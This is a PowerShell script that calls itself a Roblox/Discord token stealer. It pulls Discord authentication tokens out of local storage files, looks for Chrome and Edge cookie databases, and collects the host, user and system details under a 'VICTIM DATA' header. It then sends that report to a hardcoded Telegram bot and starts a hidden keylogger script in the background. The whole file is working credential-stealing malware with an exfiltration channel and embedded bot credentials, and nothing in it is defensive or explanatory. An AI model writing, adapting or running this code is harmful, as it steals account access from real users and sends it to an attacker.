# stealer.ps1 — Roblox/Discord token stealer
# Sends to Telegram via Invoke-RestMethod

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"

function Send-Telegram {
    param([string]$Message)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
            chat_id = $chatId
            text = $Message
            parse_mode = "HTML"
        } | Out-Null
    } catch {}
}

function Get-DiscordToken {
    $discordPaths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb"
    )
    $tokens = @()
    $tokenRegex = '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}'

    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            Get-ChildItem -Path $path -Include "*.ldb","*.log" -Recurse | foreach {
                try {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $matches = [regex]::Matches($content, $tokenRegex)
                    foreach ($match in $matches) {
                        $tokens += $match.Value
                    }
                } catch {}
            }
        }
    }
    return $tokens | Select-Object -Unique
}

function Get-RobloxCookie {
    $cookiePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
    )
    $found = @()
    foreach ($path in $cookiePaths) {
        if (Test-Path $path) {
            $found += "Cookie DB found: $path"
        }
    }
    return $found
}

# Main execution
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

$report = "<b>[+] VICTIM DATA</b>`n"
$report += "Host: <code>$hostname</code>`n"
$report += "User: <code>$username</code>`n"
$report += "Time: <code>$timestamp</code>`n`n"

# Discord tokens
$discordTokens = Get-DiscordToken
if ($discordTokens) {
    $report += "<b>DISCORD TOKENS:</b>`n"
    foreach ($token in $discordTokens) {
        $report += "<code>$token</code>`n"
    }
} else {
    $report += "Discord: No tokens found`n"
}

# Roblox indicators
$robloxData = Get-RobloxCookie
if ($robloxData) {
    $report += "`n<b>ROBLOX:</b>`n"
    foreach ($item in $robloxData) {
        $report += "$item`n"
    }
}

# System info
$report += "`n<b>SYSTEM:</b>`n"
$report += "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)`n"
$report += "CPU: $((Get-CimInstance Win32_Processor).Name)`n"
$report += "RAM: $([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/GB,2)) GB`n"

Send-Telegram -Message $report

# Start keylogger as background job
$keyloggerPath = "$env:TEMP\keylogger.ps1"
if (Test-Path $keyloggerPath) {
    Start-Job -ScriptBlock {
        param($path)
        powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $path
    } -ArgumentList $keyloggerPath | Out-Null
}

Write-Host "SUCCESS" -ForegroundColor Green
